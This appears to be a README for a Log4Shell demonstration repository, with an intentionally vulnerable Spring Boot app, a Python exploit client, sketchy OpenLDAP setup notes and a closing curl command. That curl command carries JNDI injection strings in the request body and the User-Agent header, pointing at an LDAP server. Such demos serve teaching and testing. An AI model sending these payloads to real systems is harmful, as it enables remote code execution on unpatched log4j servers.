This repository contains a demo of the log4j vulnerability that got large attention in december 2021.

One part of the code is the Spring Boot application. This application is based on an older version of Spring Boot and an older version of log4j.
The other part of the code is a simple client written in Python. This client can be used to make REST calls to exploit the vulnerability.
The third part of the demo is not included in this repository

Building and running the Spring Boot application locally:
Simply run `mvn clean install` and start it then either in IntelliJ or by running `java -jar target/<name>.jar`
Some notes regarding this repo:

Spring Boot app (vulnerable)


ldap notes
openldap
how to install openldap

how to configure openldap

how to start openldap
sudo /usr/libexec/slapd -d3

ldapsearch -H ldap://localhost:389/test -x


curl command
curl -v -X POST http://localhost:8080/post -d '${jndi:ldap://my-domain:389/localhost}' -H 'User-Agent: ${jndi:ldap://localhost:389}'
